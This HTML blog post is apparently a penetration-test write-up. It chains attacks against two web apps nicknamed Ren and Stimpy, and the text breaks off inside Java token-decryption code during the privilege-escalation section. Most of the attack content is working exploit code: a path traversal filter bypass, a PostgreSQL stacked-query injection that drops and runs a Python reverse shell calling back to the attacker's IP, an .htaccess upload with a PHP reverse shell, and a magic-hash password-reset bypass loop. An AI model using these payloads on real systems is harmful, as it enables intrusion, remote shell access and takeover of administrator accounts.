      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="sunday scaries: exploiting web apps">

    
        <title>sunday scaries: exploiting web apps | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    sunday scaries: exploiting web apps
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 29, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#ren">Ren</a>
      <ul>
        <li><a href="#analyzing-download">analyzing <code>download</code></a></li>
        <li><a href="#injecting-a-crafted-path">injecting a crafted path</a></li>
        <li><a href="#sqli-adminuserscategoryid">SQLi: <code>/admin/users/category?id=</code></a></li>
        <li><a href="#reverse-shell-payload">reverse shell payload</a></li>
      </ul>
    </li>
    <li><a href="#stimpy">Stimpy</a>
      <ul>
        <li><a href="#bypassing-file-blacklists">bypassing file blacklists</a></li>
        <li><a href="#type-juggling">type juggling</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">privilege escalation</a>
      <ul>
        <li><a href="#exploit-ren">exploit: Ren</a></li>
        <li><a href="#exploit-stimpy">exploit: Stimpy</a></li>
      </ul>
    </li>
  </ul>
</nav>
</aside>


<main><p>during a recent penetration test, i encountered two linked web apps that i thought would be good case studies for a blog post. let&rsquo;s call them Ren + Stimpy.</p>
<p>Ren is a custom-built web app, designed to manage user interactions + content. users can upload/download content, manager user roles, and interact with the database in the backend.</p>
<p>Stimpy handles uploaded invoices and user accounts, dealing with a variety of file uploads.</p>
<p>as you&rsquo;ll see, i was able to chain together path traversal, SQL injection, arbitrary file uploads, and type juggling attacks to achieve RCE [Remote Code Execution], and how i assembled the full exploit script piece-by-piece.</p>
<h2 id="ren">Ren</h2>
<h3 id="analyzing-download">analyzing <code>download</code></h3>
<p>i began by analyzing the <strong>download</strong> functionality in Ren.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>@GetMapping({<span style="color:#f1fa8c">&#34;/download&#34;</span>})
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> ResponseEntity<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]&gt;</span> <span style="color:#50fa7b">getImage</span>(@RequestParam(<span style="color:#f1fa8c">&#34;id&#34;</span>) String id) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> image <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">downloadService</span>.<span style="color:#50fa7b">getPDF</span>(id.<span style="color:#50fa7b">replace</span>(<span style="color:#f1fa8c">&#34;../&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>));
</span></span><span style="display:flex;"><span>        HttpHeaders headers <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HttpHeaders();
</span></span><span style="display:flex;"><span>        headers.<span style="color:#50fa7b">add</span>(<span style="color:#f1fa8c">&#34;Content-Disposition&#34;</span>, <span style="color:#f1fa8c">&#34;attachment; filename=ren.pdf&#34;</span>);
</span></span><span style="display:flex;"><span>        headers.<span style="color:#50fa7b">add</span>(<span style="color:#f1fa8c">&#34;Cache-Control&#34;</span>, <span style="color:#f1fa8c">&#34;no-cache, no-store&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ((BodyBuilder)ResponseEntity.<span style="color:#50fa7b">ok</span>().<span style="color:#50fa7b">headers</span>(headers)).<span style="color:#50fa7b">contentType</span>(MediaType.<span style="color:#50fa7b">APPLICATION_PDF</span>).<span style="color:#50fa7b">body</span>(image);
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">catch</span> (Exception var4) {
</span></span><span style="display:flex;"><span>        logger.<span style="color:#50fa7b">error</span>(var4.<span style="color:#50fa7b">getMessage</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> ResponseEntity.<span style="color:#50fa7b">notFound</span>().<span style="color:#50fa7b">build</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>this function attempts to filter out path elements like <code>../</code>, but this can be bypassed. it filters out <code>../</code> from the <code>id</code> parameter, but it doesn&rsquo;t account for bypasses like <code>..././</code>, which can allow attackers to access files outside the intended directory.</p>
<h3 id="injecting-a-crafted-path">injecting a crafted path</h3>
<p>by injecting a crafted path (<code>..././</code>), i was able to retrieve the file <code>config/uuid</code>, that contained an encryption key used to secure tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>uuid <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/download?id=..././conf/uuid&#39;</span>)<span style="color:#ff79c6">.</span>text
</span></span></code></pre></div><h3 id="sqli-adminuserscategoryid">SQLi: <code>/admin/users/category?id=</code></h3>
<p>next, i analyzed the <strong>administrative</strong> functionality. there&rsquo;s a rather glaring SQL injection vulnerability in the <code>/admin/users/category?id=</code> parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> List<span style="color:#ff79c6">&lt;</span>User<span style="color:#ff79c6">&gt;</span> <span style="color:#50fa7b">getUsersWithPostsInCategory</span>(String categoryId) <span style="color:#8be9fd;font-style:italic">throws</span> Exception {
</span></span><span style="display:flex;"><span>    String sql <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;SELECT u.id, u.username, &#39;***&#39; as password, u.isAdmin, u.isActive, u.email &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;FROM users u LEFT OUTER JOIN stories s ON s.owner_id = u.id &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;LEFT OUTER JOIN categories c ON s.category_id = c.id WHERE s.category_id = &#34;</span> <span style="color:#ff79c6">+</span> categoryId;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">this</span>.<span style="color:#50fa7b">template</span>.<span style="color:#50fa7b">query</span>(sql, <span style="color:#ff79c6">new</span> UserRowMapper());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="reverse-shell-payload">reverse shell payload</h3>
<p>this query dynamically inserts <code>categoryId</code> without any sanitization. using a stacked SQL query, i injected a reverse shell payload that would connect back to my machine, giving me full remote access to the server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>b64payload <span style="color:#ff79c6">=</span> base64<span style="color:#ff79c6">.</span>b64encode(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">import socket, subprocess, os, pty;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">s.connect((&#34;</span><span style="color:#f1fa8c">{</span>IP<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;, 5555));
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 0);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 1);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">os.dup2(s.fileno(), 2);
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">pty.spawn(&#34;/bin/bash&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/admin/users/category?id=1; COPY(SELECT convert_from(decode(&#39;&#34;</span> <span style="color:#ff79c6">+</span> b64payload<span style="color:#ff79c6">.</span>decode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&#39;, &#39;base64&#39;), &#39;utf-8&#39;)) to &#39;/tmp/shell.py&#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;python3 /tmp/shell.py&#39;;&#34;</span>)
</span></span></code></pre></div><p><code>socket.socket()</code> creates a new network socket, and <code>s.connect()</code> makes the target connect to my IP address over port <code>5555</code>. <code>os.dup()</code> redirect the standard input, output, and error file descriptors (<code>0</code>, <code>1</code>, <code>2</code>) to the socket <code>s</code>. any command executed on the target will be sent back to me via the socket.</p>
<p><code>pty.spawn()</code> spawns a bash shell, which gives me an interactive command-line session on the target. encoding everything in base64 just means i can transmit binary/special characters as plaintext.</p>
<p>the target URL <code>/admin/users/category?id=1</code> is vulnerable to SQL injection via stacked queries. this means i can append + execute additional SQL commands after the legitimate query.</p>
<p>the base64-encoded payload is injected into the SQL query via <code>id</code>, after which the query decodes the payload back to the original Python code, and writes the decoded payload to a temporary file <code>/tmp/shell.py</code> on the server, using <code>COPY</code> (PostgreSQL).</p>
<p>once the payload is in <code>/tmp/shell.py</code>, the SQL injection creates + runs the reverse shell by executing <code>COPY cmd_exec FROM PROGRAM 'python3 /tmp/shell.py'</code>. this allows the execution of external programs, running the shell script on the target. the commands <code>DROP TABLE IF EXISTS cmd_exec</code> and <code>CREATE TABLE cmd_exec</code> are just regular commands used to create temporary tables. i included them just to make the query structure valid in PostgreSQL.</p>
<h2 id="stimpy">Stimpy</h2>
<h3 id="bypassing-file-blacklists">bypassing file blacklists</h3>
<p>now that Ren&rsquo;s fully compromised, i turned my attention to Stimpy. the first vulnerability i found was in the <strong>file upload</strong> functionality.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">importInvoices</span>(<span style="color:#8be9fd;font-style:italic">$request</span>, <span style="color:#8be9fd;font-style:italic">$response</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span>[<span style="color:#f1fa8c">&#39;auth&#39;</span>]<span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">user</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$directory</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">settings</span>[<span style="color:#f1fa8c">&#39;importDirectory&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$uploadedFiles</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$request</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getUploadedFiles</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$uploadedFile</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$uploadedFiles</span>[<span style="color:#f1fa8c">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$uploadedFile</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getError</span>() <span style="color:#ff79c6">===</span> UPLOAD_ERR_OK) {
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$filename</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$uploadedFile</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">getClientFilename</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">$f_validation</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">validator</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">validate</span>([
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;filename&#34;</span> <span style="color:#ff79c6">=&gt;</span> <span style="color:#8be9fd;font-style:italic">$filename</span>
</span></span><span style="display:flex;"><span>        ], [
</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;filename&#39;</span> <span style="color:#ff79c6">=&gt;</span> v<span style="color:#ff79c6">::</span><span style="color:#50fa7b">alnum</span>(<span style="color:#f1fa8c">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>        ]);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$f_validation</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">failed</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">helper</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">error</span>(<span style="color:#8be9fd;font-style:italic">$f_validation</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">errors</span>, <span style="color:#8be9fd;font-style:italic">$response</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (in_array(pathinfo(<span style="color:#8be9fd;font-style:italic">$filename</span>, PATHINFO_EXTENSION), <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">settings</span>[<span style="color:#f1fa8c">&#39;restrictedExt&#39;</span>])) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">container</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">helper</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">error</span>([<span style="color:#f1fa8c">&#34;Invalid Extension&#34;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#34;Extension is not allowed&#34;</span>]], <span style="color:#8be9fd;font-style:italic">$response</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>it attempts to block dangerous file extensions using a blacklist: <code>restrictedExt</code>.</p>
<p>however, the list isn&rsquo;t exhaustive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;restrictedExt&#39;</span> <span style="color:#ff79c6">=&gt;</span> [<span style="color:#f1fa8c">&#39;php&#39;</span>, <span style="color:#f1fa8c">&#39;php2&#39;</span>, <span style="color:#f1fa8c">&#39;php3&#39;</span>, <span style="color:#f1fa8c">&#39;php4&#39;</span>, <span style="color:#f1fa8c">&#39;php5&#39;</span>, <span style="color:#f1fa8c">&#39;phtml&#39;</span>, <span style="color:#f1fa8c">&#39;exe&#39;</span>, <span style="color:#f1fa8c">&#39;asp&#39;</span>, <span style="color:#f1fa8c">&#39;cgi&#39;</span>, <span style="color:#f1fa8c">&#39;vbs&#39;</span>, <span style="color:#f1fa8c">&#39;pl&#39;</span>, <span style="color:#f1fa8c">&#39;com&#39;</span>]
</span></span></code></pre></div><p>exploiting this is a three-part process. first, i have to upload the <code>.htaccess</code> file. this file contains <strong>Apache rewrite rules</strong> that allow execution of files with a <code>.php6</code> extension. this will bypass the restricted file extensions.</p>
<p>next, i&rsquo;ll have to upload a PHP reverse shell <code>shell.php6</code>. like the shell in Ren, this will connect back to my machine on a specified IP and port.</p>
<p>finally, i&rsquo;ll have to execute. this will be done by sending a <code>GET</code> request to the uploaded shell script <code>/imports/shell.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4"># upload .htaccess file to enable execution of PHP files with unusual extensions</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;.htaccess&#39;</span>, <span style="color:#f1fa8c">&#39;RewriteEngine on</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">RewriteRule shell.php shell.php6&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># upload reverse shell in PHP</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/import&#39;</span>, files<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;file&#39;</span>: (<span style="color:#f1fa8c">&#39;shell.php6&#39;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&lt;?php $s=fsockopen(&#34;</span><span style="color:#f1fa8c">{</span>my_ip<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;,4444); $p=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s), $pipes); ?&gt;&#39;</span>)})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># execute the uploaded reverse shell</span>
</span></span><span style="display:flex;"><span>session<span style="color:#ff79c6">.</span>get(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/imports/shell.php&#39;</span>)
</span></span></code></pre></div><h3 id="type-juggling">type juggling</h3>
<p>now that i&rsquo;ve abused the lax file extension restrictions, i can move on to the next vulnerability. i noticed a flaw in the password reset mechanism: <strong>type juggling</strong>. this allows an attacker to bypass the password reset token check and reset the administrator&rsquo;s password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">checkResetLink</span>(<span style="color:#8be9fd;font-style:italic">$userId</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$sig</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">::</span><span style="color:#50fa7b">find</span>(<span style="color:#8be9fd;font-style:italic">$userId</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">empty</span>(<span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">resetToken</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$this</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">generateSig</span>(<span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">id</span>, <span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">resetToken</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$user</span><span style="color:#ff79c6">-&gt;</span><span style="color:#50fa7b">password</span>) <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">$sig</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">public</span> <span style="color:#ff79c6">function</span> <span style="color:#50fa7b">generateSig</span>(<span style="color:#8be9fd;font-style:italic">$id</span>, <span style="color:#8be9fd;font-style:italic">$resetToken</span>, <span style="color:#8be9fd;font-style:italic">$time</span>, <span style="color:#8be9fd;font-style:italic">$password</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> substr(hash(<span style="color:#f1fa8c">&#34;sha256&#34;</span>, <span style="color:#8be9fd;font-style:italic">$id</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$resetToken</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$time</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;|&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$password</span>), <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>the reset token is being compared using a weak comparison operator <code>==</code>. weak comparison can treat two values as equal if they evaluate to the same number, even when they&rsquo;re strings. hence, i can &ldquo;force&rdquo; a comparison to return true by using a <strong>magic hash</strong>. for example, the string <code>0e123456</code> is considered <code>0</code> when evaluated as a number. if the reset token on the server is also weakly compared and happens to be evaluated as <code>0</code>, i can bypass the token check!</p>
<p>i created two functions for the exploit: <code>ResetLink()</code> and <code>Test()</code>. <code>ResetLink()</code> sends a password reset request to the server using the <code>forgot password</code> endpoint. it submits the admin email to initiate the reset process.</p>
<p><code>Test()</code> checks if the server accepts the password reset link by making a <code>GET</code> request to a URL crafted with a <strong>timestamp</strong> <code>ts</code> and the <strong>magic hash</strong> <code>0e123456</code>. hopefully, it will be interpreted as scientific notation and lead to a false positive.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ResetLink</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#ff79c6">.</span>post(target <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/forgot&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;email&#39;</span>: email})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">Test</span>():
</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;Reset your password below&#34;</span> <span style="color:#ff79c6">in</span> resp<span style="color:#ff79c6">.</span>text:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
</span></span></code></pre></div><p>all i need to do now is to repeatedly request a password reset link using the admin&rsquo;s email. the <code>Test()</code> function will check if the <strong>magic hash</strong> URL is accepted, and, if so, a new password will be submitted, along with a confirmation of success.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
</span></span><span style="display:flex;"><span>    ResetLink()
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> Test():
</span></span><span style="display:flex;"><span>        session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>target<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/reset/1/</span><span style="color:#f1fa8c">{</span>ts<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/0e123456&#39;</span>, data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;password&#39;</span>:password})
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;hell yeah brother!&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>
</span></span></code></pre></div><h2 id="privilege-escalation">privilege escalation</h2>
<p>the final step is <strong>privilege escalation</strong>. recall the <strong>path traversal</strong> exploit that allowed me to retrieve the <code>config/uuid</code> file. the UUID is a critical piece because it&rsquo;s the key to decrypting/encrypting session tokens. let&rsquo;s take a look at the <code>Tokenizer.java</code> class that i&rsquo;ll exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Tokenizer</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> String <span style="color:#50fa7b">decryptToken</span>(String user, String token, String uuid) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>            SecretKey key <span style="color:#ff79c6">=</span> getKeyForUser(user, uuid);
</span></span><span style="display:flex;"><span>            Cipher cipher <span style="color:#ff79c6">=</span> Cipher.<span style="color:#50fa7b">getInstance</span>(<span style="color:#f1fa8c">&#34;DESede/ECB/PKCS5Padding&#34;</span>);
</span></span><span style="display:flex;"><span>            cipher.<span style="color:#50fa7b">init</span>(Cipher.<span style="color:#50fa7b">DECRYPT_MODE</span>, key);
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> enc <span style="color:#ff79c6">=</span> Base64.<span style="color:#50fa7b">getUrlDecoder</span>().<span style="color:#50fa7b">decode</span>(token.<span style="color:#50fa7b">getBytes</span>(<span style="color:#f1fa8c">&#34;UTF-8&#34;</span>));
